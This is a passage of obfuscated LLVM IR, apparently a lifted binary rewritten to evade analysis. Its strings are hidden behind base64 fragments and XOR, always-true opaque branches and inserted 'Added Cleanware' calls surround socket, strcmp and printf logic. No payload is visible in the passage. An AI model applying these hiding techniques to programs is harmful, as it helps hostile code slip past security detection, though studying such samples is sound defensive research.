  %sp5.129 = bitcast i8* %next4.129 to [1 x i8]*
  store [1 x i8] %s5.129, [1 x i8]* %sp5.129
  %next5.129 = getelementptr [9 x i8], [9 x i8]* %sp129, i32 0, i32 6
  
;-------------------------------
; Replace: %s6.129 = load [1 x i8], [1 x i8]* @str.6.129
  %cipher.ptr.332 = alloca [5 x i8]
  store [5 x i8] c"\58\51\3d\3d\00", [5 x i8]* %cipher.ptr.332
  %cipher.332 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.332, i32 0, i32 0
  %plain.ptr.332 = tail call i8* @base64_decode(i8* %cipher.332)
  %spi332 = bitcast i8* %plain.ptr.332 to [1 x i8]*
  %s6.129 = load [1 x i8], [1 x i8]* %spi332
;-------------------------------
  %sp6.129 = bitcast i8* %next5.129 to [1 x i8]*
  store [1 x i8] %s6.129, [1 x i8]* %sp6.129
  %next6.129 = getelementptr [9 x i8], [9 x i8]* %sp129, i32 0, i32 7
  
;-------------------------------
; Replace: %s7.129 = load [2 x i8], [2 x i8]* @str.7.129
  %cipher.ptr.338 = alloca [5 x i8]
  store [5 x i8] c"\52\44\63\3d\00", [5 x i8]* %cipher.ptr.338
  %cipher.338 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.338, i32 0, i32 0
  %plain.ptr.338 = tail call i8* @base64_decode(i8* %cipher.338)
  %spi338 = bitcast i8* %plain.ptr.338 to [2 x i8]*
  %s7.129 = load [2 x i8], [2 x i8]* %spi338
;-------------------------------
  %sp7.129 = bitcast i8* %next6.129 to [2 x i8]*
  store [2 x i8] %s7.129, [2 x i8]* %sp7.129

  %spi129 = load [9 x i8], [9 x i8]* %sp129
  store [9 x i8] %spi129, [9 x i8]* %sp0.74
;-------------------------------
  %sp0.1.74 = bitcast [9 x i8]* %sp0.74 to i72*
  %i0.74 = load i72, i72* %sp0.1.74

  %sp1.74 = alloca [9 x i8]
;-------------------------------
; Replace: store [9 x i8] c"\65\45\77\49\58\35\38\4e\37", [9 x i8]* %sp1.74
  %sp130 = alloca [9 x i8]
  
;-------------------------------
; Replace: %s0.130 = load [1 x i8], [1 x i8]* @str.0.130
  %cipher.ptr.340 = alloca [5 x i8]
  store [5 x i8] c"\5a\51\3d\3d\00", [5 x i8]* %cipher.ptr.340
  %cipher.340 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.340, i32 0, i32 0
  %plain.ptr.340 = tail call i8* @base64_decode(i8* %cipher.340)
  %spi340 = bitcast i8* %plain.ptr.340 to [1 x i8]*
  %s0.130 = load [1 x i8], [1 x i8]* %spi340
;-------------------------------
  %sp0.130 = bitcast [9 x i8]* %sp130 to [1 x i8]*
  store [1 x i8] %s0.130, [1 x i8]* %sp0.130
  %next0.130 = getelementptr [9 x i8], [9 x i8]* %sp130, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.130 = load [1 x i8], [1 x i8]* @str.1.130
  %cipher.ptr.343 = alloca [5 x i8]
  store [5 x i8] c"\52\51\3d\3d\00", [5 x i8]* %cipher.ptr.343
  %cipher.343 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.343, i32 0, i32 0
  %plain.ptr.343 = tail call i8* @base64_decode(i8* %cipher.343)
  %spi343 = bitcast i8* %plain.ptr.343 to [1 x i8]*
  %s1.130 = load [1 x i8], [1 x i8]* %spi343
;-------------------------------
  %sp1.130 = bitcast i8* %next0.130 to [1 x i8]*
  store [1 x i8] %s1.130, [1 x i8]* %sp1.130
  %next1.130 = getelementptr [9 x i8], [9 x i8]* %sp130, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.130 = load [1 x i8], [1 x i8]* @str.2.130
  %cipher.ptr.344 = alloca [5 x i8]
  store [5 x i8] c"\64\77\3d\3d\00", [5 x i8]* %cipher.ptr.344
  %cipher.344 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.344, i32 0, i32 0
  %plain.ptr.344 = tail call i8* @base64_decode(i8* %cipher.344)
  %spi344 = bitcast i8* %plain.ptr.344 to [1 x i8]*
  %s2.130 = load [1 x i8], [1 x i8]* %spi344
;-------------------------------
  %sp2.130 = bitcast i8* %next1.130 to [1 x i8]*
  store [1 x i8] %s2.130, [1 x i8]* %sp2.130
  %next2.130 = getelementptr [9 x i8], [9 x i8]* %sp130, i32 0, i32 3
  
;-------------------------------
; Replace: %s3.130 = load [1 x i8], [1 x i8]* @str.3.130
  %cipher.ptr.346 = alloca [5 x i8]
  store [5 x i8] c"\53\51\3d\3d\00", [5 x i8]* %cipher.ptr.346
  %cipher.346 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.346, i32 0, i32 0
  %plain.ptr.346 = tail call i8* @base64_decode(i8* %cipher.346)
  %spi346 = bitcast i8* %plain.ptr.346 to [1 x i8]*
  %s3.130 = load [1 x i8], [1 x i8]* %spi346
;-------------------------------
  %sp3.130 = bitcast i8* %next2.130 to [1 x i8]*
  store [1 x i8] %s3.130, [1 x i8]* %sp3.130
  %next3.130 = getelementptr [9 x i8], [9 x i8]* %sp130, i32 0, i32 4
  
;-------------------------------
; Replace: %s4.130 = load [1 x i8], [1 x i8]* @str.4.130
  %cipher.ptr.341 = alloca [5 x i8]
  store [5 x i8] c"\57\41\3d\3d\00", [5 x i8]* %cipher.ptr.341
  %cipher.341 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.341, i32 0, i32 0
  %plain.ptr.341 = tail call i8* @base64_decode(i8* %cipher.341)
  %spi341 = bitcast i8* %plain.ptr.341 to [1 x i8]*
  %s4.130 = load [1 x i8], [1 x i8]* %spi341
;-------------------------------
  %sp4.130 = bitcast i8* %next3.130 to [1 x i8]*
  store [1 x i8] %s4.130, [1 x i8]* %sp4.130
  %next4.130 = getelementptr [9 x i8], [9 x i8]* %sp130, i32 0, i32 5
  
;-------------------------------
; Replace: %s5.130 = load [1 x i8], [1 x i8]* @str.5.130
  %cipher.ptr.342 = alloca [5 x i8]
  store [5 x i8] c"\4e\51\3d\3d\00", [5 x i8]* %cipher.ptr.342
  %cipher.342 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.342, i32 0, i32 0
  %plain.ptr.342 = tail call i8* @base64_decode(i8* %cipher.342)
  %spi342 = bitcast i8* %plain.ptr.342 to [1 x i8]*
  %s5.130 = load [1 x i8], [1 x i8]* %spi342
;-------------------------------
  %sp5.130 = bitcast i8* %next4.130 to [1 x i8]*
  store [1 x i8] %s5.130, [1 x i8]* %sp5.130
  %next5.130 = getelementptr [9 x i8], [9 x i8]* %sp130, i32 0, i32 6
  
;-------------------------------
; Replace: %s6.130 = load [1 x i8], [1 x i8]* @str.6.130
  %cipher.ptr.345 = alloca [5 x i8]
  store [5 x i8] c"\4f\41\3d\3d\00", [5 x i8]* %cipher.ptr.345
  %cipher.345 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.345, i32 0, i32 0
  %plain.ptr.345 = tail call i8* @base64_decode(i8* %cipher.345)
  %spi345 = bitcast i8* %plain.ptr.345 to [1 x i8]*
  %s6.130 = load [1 x i8], [1 x i8]* %spi345
;-------------------------------
  %sp6.130 = bitcast i8* %next5.130 to [1 x i8]*
  store [1 x i8] %s6.130, [1 x i8]* %sp6.130
  %next6.130 = getelementptr [9 x i8], [9 x i8]* %sp130, i32 0, i32 7
  
;-------------------------------
; Replace: %s7.130 = load [2 x i8], [2 x i8]* @str.7.130
  %cipher.ptr.347 = alloca [5 x i8]
  store [5 x i8] c"\54\6a\63\3d\00", [5 x i8]* %cipher.ptr.347
  %cipher.347 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.347, i32 0, i32 0
  %plain.ptr.347 = tail call i8* @base64_decode(i8* %cipher.347)
  %spi347 = bitcast i8* %plain.ptr.347 to [2 x i8]*
  %s7.130 = load [2 x i8], [2 x i8]* %spi347
;-------------------------------
  %sp7.130 = bitcast i8* %next6.130 to [2 x i8]*
  store [2 x i8] %s7.130, [2 x i8]* %sp7.130

  %spi130 = load [9 x i8], [9 x i8]* %sp130
  store [9 x i8] %spi130, [9 x i8]* %sp1.74
;-------------------------------
  %sp1.1.74 = bitcast [9 x i8]* %sp1.74 to i72*
  %i1.74 = load i72, i72* %sp1.1.74

  %xp74 = xor i72 %i0.74, %i1.74

  %fi.74 = alloca i72
  store i72 %xp74, i72* %fi.74

;-------------------------------
;--------Basic Condition--------
  %.not111.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not111.i.i, label %BB_111, label %next111
next111:
;-------------------------------
  %spi74 = ptrtoint i72* %fi.74 to i32
  store i32 %spi74, i32* %14, align 4
;-------------------------------
  %23 = load i32, i32* %22, align 8
  %tmp2_v7.i.i.i = add i32 %tmp0_v.i.i, -76
  %24 = inttoptr i32 %tmp2_v7.i.i.i to i32*
;-------------------------------
;--------Basic Condition--------
  %.not99.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not99.i.i, label %BB_99, label %next99
next99:
;-------------------------------
  store i32 %23, i32* %24, align 4
  %tmp2_v9.i.i.i = add i32 %tmp0_v.i.i, -80
  %25 = inttoptr i32 %tmp2_v9.i.i.i to i32*
;-------------------------------
; Replace: store i32 134520863, i32* %25, align 16
;-------------------------------
;--------Basic Condition--------
  %.not101.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not101.i.i, label %BB_101, label %next101
next101:
;-------------------------------
  %sp0.75 = alloca [3 x i8]
;-------------------------------
; Replace: store [3 x i8] c"\4C\02\47", [3 x i8]* %sp0.75
  %sp131 = alloca [3 x i8]
  
;-------------------------------
; Replace: %s0.131 = load [1 x i8], [1 x i8]* @str.0.131
  %cipher.ptr.349 = alloca [5 x i8]
  store [5 x i8] c"\54\41\3d\3d\00", [5 x i8]* %cipher.ptr.349
  %cipher.349 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.349, i32 0, i32 0
  %plain.ptr.349 = tail call i8* @base64_decode(i8* %cipher.349)
  %spi349 = bitcast i8* %plain.ptr.349 to [1 x i8]*
  %s0.131 = load [1 x i8], [1 x i8]* %spi349
;-------------------------------
  %sp0.131 = bitcast [3 x i8]* %sp131 to [1 x i8]*
  store [1 x i8] %s0.131, [1 x i8]* %sp0.131
  %next0.131 = getelementptr [3 x i8], [3 x i8]* %sp131, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.131 = load [1 x i8], [1 x i8]* @str.1.131
  %cipher.ptr.350 = alloca [5 x i8]
  store [5 x i8] c"\41\67\3d\3d\00", [5 x i8]* %cipher.ptr.350
  %cipher.350 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.350, i32 0, i32 0
  %plain.ptr.350 = tail call i8* @base64_decode(i8* %cipher.350)
  %spi350 = bitcast i8* %plain.ptr.350 to [1 x i8]*
  %s1.131 = load [1 x i8], [1 x i8]* %spi350
;-------------------------------
  %sp1.131 = bitcast i8* %next0.131 to [1 x i8]*
  store [1 x i8] %s1.131, [1 x i8]* %sp1.131
  %next1.131 = getelementptr [3 x i8], [3 x i8]* %sp131, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.131 = load [1 x i8], [1 x i8]* @str.2.131
  %cipher.ptr.348 = alloca [5 x i8]
  store [5 x i8] c"\52\77\3d\3d\00", [5 x i8]* %cipher.ptr.348
  %cipher.348 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.348, i32 0, i32 0
  %plain.ptr.348 = tail call i8* @base64_decode(i8* %cipher.348)
  %spi348 = bitcast i8* %plain.ptr.348 to [1 x i8]*
  %s2.131 = load [1 x i8], [1 x i8]* %spi348
;-------------------------------
  %sp2.131 = bitcast i8* %next1.131 to [1 x i8]*
  store [1 x i8] %s2.131, [1 x i8]* %sp2.131

  %spi131 = load [3 x i8], [3 x i8]* %sp131
  store [3 x i8] %spi131, [3 x i8]* %sp0.75
;-------------------------------
  %sp0.1.75 = bitcast [3 x i8]* %sp0.75 to i24*
  %i0.75 = load i24, i24* %sp0.1.75

  %sp1.75 = alloca [3 x i8]
;-------------------------------
; Replace: store [3 x i8] c"\69\71\47", [3 x i8]* %sp1.75
  %sp132 = alloca [3 x i8]
  
;-------------------------------
; Replace: %s0.132 = load [1 x i8], [1 x i8]* @str.0.132
  %cipher.ptr.353 = alloca [5 x i8]
  store [5 x i8] c"\61\51\3d\3d\00", [5 x i8]* %cipher.ptr.353
  %cipher.353 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.353, i32 0, i32 0
  %plain.ptr.353 = tail call i8* @base64_decode(i8* %cipher.353)
  %spi353 = bitcast i8* %plain.ptr.353 to [1 x i8]*
  %s0.132 = load [1 x i8], [1 x i8]* %spi353
;-------------------------------
  %sp0.132 = bitcast [3 x i8]* %sp132 to [1 x i8]*
  store [1 x i8] %s0.132, [1 x i8]* %sp0.132
  %next0.132 = getelementptr [3 x i8], [3 x i8]* %sp132, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.132 = load [1 x i8], [1 x i8]* @str.1.132
  %cipher.ptr.352 = alloca [5 x i8]
  store [5 x i8] c"\63\51\3d\3d\00", [5 x i8]* %cipher.ptr.352
  %cipher.352 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.352, i32 0, i32 0
  %plain.ptr.352 = tail call i8* @base64_decode(i8* %cipher.352)
  %spi352 = bitcast i8* %plain.ptr.352 to [1 x i8]*
  %s1.132 = load [1 x i8], [1 x i8]* %spi352
;-------------------------------
  %sp1.132 = bitcast i8* %next0.132 to [1 x i8]*
  store [1 x i8] %s1.132, [1 x i8]* %sp1.132
  %next1.132 = getelementptr [3 x i8], [3 x i8]* %sp132, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.132 = load [1 x i8], [1 x i8]* @str.2.132
  %cipher.ptr.351 = alloca [5 x i8]
  store [5 x i8] c"\52\77\3d\3d\00", [5 x i8]* %cipher.ptr.351
  %cipher.351 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.351, i32 0, i32 0
  %plain.ptr.351 = tail call i8* @base64_decode(i8* %cipher.351)
  %spi351 = bitcast i8* %plain.ptr.351 to [1 x i8]*
  %s2.132 = load [1 x i8], [1 x i8]* %spi351
;-------------------------------
  %sp2.132 = bitcast i8* %next1.132 to [1 x i8]*
  store [1 x i8] %s2.132, [1 x i8]* %sp2.132

  %spi132 = load [3 x i8], [3 x i8]* %sp132
  store [3 x i8] %spi132, [3 x i8]* %sp1.75
;-------------------------------
  %sp1.1.75 = bitcast [3 x i8]* %sp1.75 to i24*
  %i1.75 = load i24, i24* %sp1.1.75

  %xp75 = xor i24 %i0.75, %i1.75

  %fi.75 = alloca i24
  store i24 %xp75, i24* %fi.75

  %spi75 = ptrtoint i24* %fi.75 to i32
  store i32 %spi75, i32* %25, align 16
;-------------------------------
  %tmp2_v10.i.i.i = add i32 %tmp0_v.i.i, -84
  %26 = inttoptr i32 %tmp2_v10.i.i.i to i32*
  store i32 134517457, i32* %26, align 4
  %27 = tail call x86_fastcallcc i64 @helper_stub_trampoline(i32 inreg noundef %tmp2_v.i.i, i32 inreg noundef 134520863, i32 noundef %tmp2_v9.i.i.i, i32 noundef ptrtoint (i32 (i8*, ...)* @printf to i32)) #11, !funcname !13
;-------------------------------
;----Call to Added Cleanware----
  tail call fastcc void @token_pasting_operator701 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack700, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
  br label %.exit

BB_804942D.i:                                     ; preds = %Func_804941F.exit.i
  %28 = load i32, i32* %8, align 4
  %tmp0_v1.i39.i = add i32 %28, 4
  %29 = inttoptr i32 %tmp0_v1.i39.i to i32*
  %30 = load i32, i32* %29, align 4
;-------------------------------
; Replace: store i32 134520902, i32* %12, align 4
  %sp0.76 = alloca [2 x i8]
;-------------------------------
; Replace: store [2 x i8] c"\5F\51", [2 x i8]* %sp0.76
  %sp133 = alloca [2 x i8]
  
;-------------------------------
; Replace: %s0.133 = load [1 x i8], [1 x i8]* @str.0.133
  %cipher.ptr.354 = alloca [5 x i8]
  store [5 x i8] c"\58\77\3d\3d\00", [5 x i8]* %cipher.ptr.354
  %cipher.354 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.354, i32 0, i32 0
  %plain.ptr.354 = tail call i8* @base64_decode(i8* %cipher.354)
  %spi354 = bitcast i8* %plain.ptr.354 to [1 x i8]*
  %s0.133 = load [1 x i8], [1 x i8]* %spi354
;-------------------------------
  %sp0.133 = bitcast [2 x i8]* %sp133 to [1 x i8]*
  store [1 x i8] %s0.133, [1 x i8]* %sp0.133
  %next0.133 = getelementptr [2 x i8], [2 x i8]* %sp133, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.133 = load [1 x i8], [1 x i8]* @str.1.133
  %cipher.ptr.355 = alloca [5 x i8]
  store [5 x i8] c"\55\51\3d\3d\00", [5 x i8]* %cipher.ptr.355
  %cipher.355 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.355, i32 0, i32 0
  %plain.ptr.355 = tail call i8* @base64_decode(i8* %cipher.355)
  %spi355 = bitcast i8* %plain.ptr.355 to [1 x i8]*
  %s1.133 = load [1 x i8], [1 x i8]* %spi355
;-------------------------------
  %sp1.133 = bitcast i8* %next0.133 to [1 x i8]*
  store [1 x i8] %s1.133, [1 x i8]* %sp1.133

  %spi133 = load [2 x i8], [2 x i8]* %sp133
  store [2 x i8] %spi133, [2 x i8]* %sp0.76
;-------------------------------
  %sp0.1.76 = bitcast [2 x i8]* %sp0.76 to i16*
  %i0.76 = load i16, i16* %sp0.1.76

  %sp1.76 = alloca [2 x i8]
;-------------------------------
; Replace: store [2 x i8] c"\6d\51", [2 x i8]* %sp1.76
  %sp134 = alloca [2 x i8]
  
;-------------------------------
; Replace: %s0.134 = load [1 x i8], [1 x i8]* @str.0.134
  %cipher.ptr.356 = alloca [5 x i8]
  store [5 x i8] c"\62\51\3d\3d\00", [5 x i8]* %cipher.ptr.356
  %cipher.356 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.356, i32 0, i32 0
  %plain.ptr.356 = tail call i8* @base64_decode(i8* %cipher.356)
  %spi356 = bitcast i8* %plain.ptr.356 to [1 x i8]*
  %s0.134 = load [1 x i8], [1 x i8]* %spi356
;-------------------------------
  %sp0.134 = bitcast [2 x i8]* %sp134 to [1 x i8]*
  store [1 x i8] %s0.134, [1 x i8]* %sp0.134
  %next0.134 = getelementptr [2 x i8], [2 x i8]* %sp134, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.134 = load [1 x i8], [1 x i8]* @str.1.134
  %cipher.ptr.357 = alloca [5 x i8]
  store [5 x i8] c"\55\51\3d\3d\00", [5 x i8]* %cipher.ptr.357
  %cipher.357 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.357, i32 0, i32 0
  %plain.ptr.357 = tail call i8* @base64_decode(i8* %cipher.357)
  %spi357 = bitcast i8* %plain.ptr.357 to [1 x i8]*
  %s1.134 = load [1 x i8], [1 x i8]* %spi357
;-------------------------------
  %sp1.134 = bitcast i8* %next0.134 to [1 x i8]*
  store [1 x i8] %s1.134, [1 x i8]* %sp1.134

  %spi134 = load [2 x i8], [2 x i8]* %sp134
  store [2 x i8] %spi134, [2 x i8]* %sp1.76
;-------------------------------
  %sp1.1.76 = bitcast [2 x i8]* %sp1.76 to i16*
  %i1.76 = load i16, i16* %sp1.1.76

  %xp76 = xor i16 %i0.76, %i1.76

  %fi.76 = alloca i16
  store i16 %xp76, i16* %fi.76

  %spi76 = ptrtoint i16* %fi.76 to i32
  store i32 %spi76, i32* %12, align 4
;-------------------------------
  store i32 %30, i32* %13, align 16
  store i32 134517829, i32* %14, align 4
  %arg.i.i9 = load i32, i32* %13, align 16
  %arg2.i.i10 = load i32, i32* %12, align 4
  %31 = tail call i32 @strcmp(i32 %arg.i.i9, i32 %arg2.i.i10)
  %.not.i51.i = icmp eq i32 %31, 0
  br i1 %.not.i51.i, label %BB_804944C.i, label %BB_8049453.i

BB_8049472.i:                                     ; preds = %BB_8049453.i
  store i32 134517879, i32* %7, align 4
  %tmp2_v.i8.i.i = add i32 %tmp0_v.i.i, -40
;-------------------------------
;----Call to Added Cleanware----
  tail call fastcc void @count_nonrepeating260 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack259, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
  %32 = inttoptr i32 %tmp2_v.i8.i.i to i32*
;-------------------------------
;--------Basic Condition--------
  %.not103.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not103.i.i, label %BB_103, label %next103
next103:
;-------------------------------
  store i32 %tmp2_v4.i.i, i32* %32, align 8
  store i32 134529024, i32* %12, align 4
  %tmp2_v2.i11.i.i = add i32 %tmp0_v.i.i, -68
  %33 = inttoptr i32 %tmp2_v2.i11.i.i to i32*
  store i32 134517678, i32* %33, align 4
  store i32 0, i32* %14, align 4
  %tmp2_v2.i18.i.i = add i32 %tmp0_v.i.i, -72
  %34 = inttoptr i32 %tmp2_v2.i18.i.i to i32*
  store i32 0, i32* %34, align 8
  %tmp2_v3.i.i.i13 = add i32 %tmp0_v.i.i, -76
  %35 = inttoptr i32 %tmp2_v3.i.i.i13 to i32*
  store i32 1, i32* %35, align 4
  %tmp2_v4.i.i.i = add i32 %tmp0_v.i.i, -80
  %36 = inttoptr i32 %tmp2_v4.i.i.i to i32*
  store i32 2, i32* %36, align 16
  %tmp2_v5.i19.i.i = add i32 %tmp0_v.i.i, -84
;-------------------------------
;----Call to Added Cleanware----
  tail call fastcc void @own_strspn569 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack568, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
  %37 = inttoptr i32 %tmp2_v5.i19.i.i to i32*
  store i32 134517705, i32* %37, align 4
  %arg.i.i.i = load i32, i32* %36, align 16
  %arg2.i.i.i = load i32, i32* %35, align 4
  %arg4.i.i.i = load i32, i32* %34, align 8
  %38 = tail call i32 @socket(i32 %arg.i.i.i, i32 %arg2.i.i.i, i32 %arg4.i.i.i)
  store i32 %38, i32* %14, align 4
;-------------------------------
;----Call to Added Cleanware----
  tail call fastcc void @void_function_return141 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack140, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
  store i32 %38, i32* %36, align 16
  store i32 134517722, i32* %37, align 4
  %arg.i.i3.i = load i32, i32* %36, align 16
  %39 = tail call i32 @close(i32 %arg.i.i3.i)
  br label %.exit

BB_804944C.i:                                     ; preds = %BB_804942D.i
;-------------------------------
;--------Basic Condition--------
  %.not107.i.i = icmp eq i32 0 , 0 ;always true
  br i1 %.not107.i.i, label %BB_107, label %next107
next107:
;-------------------------------
  store i32 134517841, i32* %7, align 4
  %tmp2_v.i39.i.i = add i32 %tmp0_v.i.i, -40
  %40 = inttoptr i32 %tmp2_v.i39.i.i to i32*
  store i32 %tmp2_v4.i.i, i32* %40, align 8
;-------------------------------
;----Call to Added Cleanware----
  tail call fastcc void @delete_substring49 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack48, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
;-------------------------------
;----Call to Added Cleanware----
  tail call fastcc void @const_pointer_vs_pointer_to_const88 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack87, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
  store i32 134529024, i32* %12, align 4
  %tmp2_v2.i44.i.i = add i32 %tmp0_v.i.i, -84
  %41 = inttoptr i32 %tmp2_v2.i44.i.i to i32*
  store i32 134517482, i32* %41, align 4
  %tmp4_v.i18.i.b.i = load i1, i1* @segs.0, align 1
  %42 = select i1 %tmp4_v.i18.i.b.i, i32* inttoptr (i32 add (i32 ptrtoint ([1024 x i8]* @_ZL6segmem to i32), i32 20) to i32*), i32* inttoptr (i32 20 to i32*)
;-------------------------------
;----Call to Added Cleanware----
  tail call fastcc void @shuffle_array397 (i32 ptrtoint (i32* getelementptr inbounds ([8092 x i32], [8092 x i32]* @stack396, i32 0, i32 8092) to i32)) nounwind
;-------------------------------
  %43 = load i32, i32* %42, align 4
  store i32 %43, i32* %14, align 4
  %tmp2_v5.i25.i.i = add i32 %tmp0_v.i.i, -92
  %44 = inttoptr i32 %tmp2_v5.i25.i.i to i32*
;-------------------------------
; Replace: store i32 134520866, i32* %44, align 4
  %sp0.77 = alloca [3 x i8]
;-------------------------------
; Replace: store [3 x i8] c"\01\40\6B", [3 x i8]* %sp0.77
  %sp135 = alloca [3 x i8]
  
;-------------------------------
; Replace: %s0.135 = load [1 x i8], [1 x i8]* @str.0.135
  %cipher.ptr.360 = alloca [5 x i8]
  store [5 x i8] c"\41\51\3d\3d\00", [5 x i8]* %cipher.ptr.360
  %cipher.360 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.360, i32 0, i32 0
  %plain.ptr.360 = tail call i8* @base64_decode(i8* %cipher.360)
  %spi360 = bitcast i8* %plain.ptr.360 to [1 x i8]*
  %s0.135 = load [1 x i8], [1 x i8]* %spi360
;-------------------------------
  %sp0.135 = bitcast [3 x i8]* %sp135 to [1 x i8]*
  store [1 x i8] %s0.135, [1 x i8]* %sp0.135
  %next0.135 = getelementptr [3 x i8], [3 x i8]* %sp135, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.135 = load [1 x i8], [1 x i8]* @str.1.135
  %cipher.ptr.358 = alloca [5 x i8]
  store [5 x i8] c"\51\41\3d\3d\00", [5 x i8]* %cipher.ptr.358
  %cipher.358 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.358, i32 0, i32 0
  %plain.ptr.358 = tail call i8* @base64_decode(i8* %cipher.358)
  %spi358 = bitcast i8* %plain.ptr.358 to [1 x i8]*
  %s1.135 = load [1 x i8], [1 x i8]* %spi358
;-------------------------------
  %sp1.135 = bitcast i8* %next0.135 to [1 x i8]*
  store [1 x i8] %s1.135, [1 x i8]* %sp1.135
  %next1.135 = getelementptr [3 x i8], [3 x i8]* %sp135, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.135 = load [1 x i8], [1 x i8]* @str.2.135
  %cipher.ptr.359 = alloca [5 x i8]
  store [5 x i8] c"\61\77\3d\3d\00", [5 x i8]* %cipher.ptr.359
  %cipher.359 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.359, i32 0, i32 0
  %plain.ptr.359 = tail call i8* @base64_decode(i8* %cipher.359)
  %spi359 = bitcast i8* %plain.ptr.359 to [1 x i8]*
  %s2.135 = load [1 x i8], [1 x i8]* %spi359
;-------------------------------
  %sp2.135 = bitcast i8* %next1.135 to [1 x i8]*
  store [1 x i8] %s2.135, [1 x i8]* %sp2.135

  %spi135 = load [3 x i8], [3 x i8]* %sp135
  store [3 x i8] %spi135, [3 x i8]* %sp0.77
;-------------------------------
  %sp0.1.77 = bitcast [3 x i8]* %sp0.77 to i24*
  %i0.77 = load i24, i24* %sp0.1.77

  %sp1.77 = alloca [3 x i8]
;-------------------------------
; Replace: store [3 x i8] c"\76\6b\6b", [3 x i8]* %sp1.77
  %sp136 = alloca [3 x i8]
  
;-------------------------------
; Replace: %s0.136 = load [1 x i8], [1 x i8]* @str.0.136
  %cipher.ptr.361 = alloca [5 x i8]
  store [5 x i8] c"\64\67\3d\3d\00", [5 x i8]* %cipher.ptr.361
  %cipher.361 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.361, i32 0, i32 0
  %plain.ptr.361 = tail call i8* @base64_decode(i8* %cipher.361)
  %spi361 = bitcast i8* %plain.ptr.361 to [1 x i8]*
  %s0.136 = load [1 x i8], [1 x i8]* %spi361
;-------------------------------
  %sp0.136 = bitcast [3 x i8]* %sp136 to [1 x i8]*
  store [1 x i8] %s0.136, [1 x i8]* %sp0.136
  %next0.136 = getelementptr [3 x i8], [3 x i8]* %sp136, i32 0, i32 1
  
;-------------------------------
; Replace: %s1.136 = load [1 x i8], [1 x i8]* @str.1.136
  %cipher.ptr.363 = alloca [5 x i8]
  store [5 x i8] c"\61\77\3d\3d\00", [5 x i8]* %cipher.ptr.363
  %cipher.363 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.363, i32 0, i32 0
  %plain.ptr.363 = tail call i8* @base64_decode(i8* %cipher.363)
  %spi363 = bitcast i8* %plain.ptr.363 to [1 x i8]*
  %s1.136 = load [1 x i8], [1 x i8]* %spi363
;-------------------------------
  %sp1.136 = bitcast i8* %next0.136 to [1 x i8]*
  store [1 x i8] %s1.136, [1 x i8]* %sp1.136
  %next1.136 = getelementptr [3 x i8], [3 x i8]* %sp136, i32 0, i32 2
  
;-------------------------------
; Replace: %s2.136 = load [1 x i8], [1 x i8]* @str.2.136
  %cipher.ptr.362 = alloca [5 x i8]
  store [5 x i8] c"\61\77\3d\3d\00", [5 x i8]* %cipher.ptr.362
  %cipher.362 = getelementptr inbounds [5 x i8], [5 x i8]* %cipher.ptr.362, i32 0, i32 0
  %plain.ptr.362 = tail call i8* @base64_decode(i8* %cipher.362)
  %spi362 = bitcast i8* %plain.ptr.362 to [1 x i8]*
  %s2.136 = load [1 x i8], [1 x i8]* %spi362
;-------------------------------
  %sp2.136 = bitcast i8* %next1.136 to [1 x i8]*
  store [1 x i8] %s2.136, [1 x i8]* %sp2.136

  %spi136 = load [3 x i8], [3 x i8]* %sp136
  store [3 x i8] %spi136, [3 x i8]* %sp1.77
;-------------------------------
  %sp1.1.77 = bitcast [3 x i8]* %sp1.77 to i24*
  %i1.77 = load i24, i24* %sp1.1.77

  %xp77 = xor i24 %i0.77, %i1.77

  %fi.77 = alloca i24
